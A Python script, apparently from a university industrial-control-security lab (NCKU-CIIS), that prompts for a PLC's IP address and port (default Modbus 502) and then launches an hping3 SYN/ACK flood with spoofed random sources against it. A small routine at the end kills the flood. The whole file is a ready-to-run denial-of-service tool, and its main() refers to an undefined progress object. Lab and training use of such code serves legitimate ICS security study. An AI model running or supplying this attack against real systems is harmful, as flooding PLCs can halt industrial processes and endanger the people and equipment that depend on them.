import os, nmap, subprocess, time
from rich.progress import Progress
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt


plc_ip = '192.168.1.5'
Att_ip = '192.168.1.20'
target_port = '502'
console = Console()

def func_start(): 
    console.clear()
    global plc_ip, Att_ip, target_port

    table = Table(show_header=True, header_style="bold yellow") # 
    table.add_column("Denial-of-service attack : DoS\nHELP: Ctrl+C to Exit\n\nCopyright 2023 NCKU-CIIS", style="bold", justify="center")
    console.print(table)
    tmp_plc_ip = Prompt.ask(f"請輸入PLC IP [Default_PLC_IP={plc_ip}]: ", default=plc_ip)
    if tmp_plc_ip != "":
        plc_ip = tmp_plc_ip
    target_port = Prompt.ask(f"請輸入攻擊目標Port通訊埠[Default_Port={target_port}]", default=target_port)
    tmp_att_ip = Prompt.ask(f"請輸入攻擊機Attacker IP [Default_Att_IP={Att_ip}]: ", default=Att_ip)
    if tmp_att_ip != "":
        Att_ip = tmp_att_ip
    console.clear()
    table.add_row("※ Hit The Target: {plc_ip}". format(plc_ip=plc_ip))
    table.add_row("※ DoS Attack_Port: {target_port}".format(target_port=target_port))

    console.print(table)
    time.sleep(0.5)

def os_hping3():
    console.log("Setting DoS Attack ...")
    time.sleep(0.5)
    with console.status("Hping3 is Running...", spinner="bouncingBall", spinner_style="bold yellow") as status:
        hping3_command = [
            'hping3',
            '-c', '8800',
            '-d', '120',
            '-A', plc_ip,
            '-w', '64',
            '-p', target_port,
            '--flood',
            '--rand-source',
            '-a', Att_ip,
        ]
        process = subprocess.Popen(hping3_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        time.sleep(1)
    if process.returncode == 0:
        console.print("Output : {}".format(out.decode()))
        console.log(":right_arrow: \nDoS Attack START !!")
    else:
        console.print("Error : {}".format(err.decode()))
        console.log(":stop_sign: Failed to start DoS Attack")
    
    

def shutdown_func():
    console.log("Stop DoS Attack / Pkill hping3 ...")
    subprocess.run(['pkill', '-f', 'hping3'])
    time.sleep(2)
    console.log(":stop_sign: DoS Attack is STOPPED !!", style="red")


def main():
    func_start()
    try:
        os_hping3()
        progress.update(task, completed=1)
    except KeyboardInterrupt:
        shutdown_func()
        
if __name__ == "__main__":
    main()
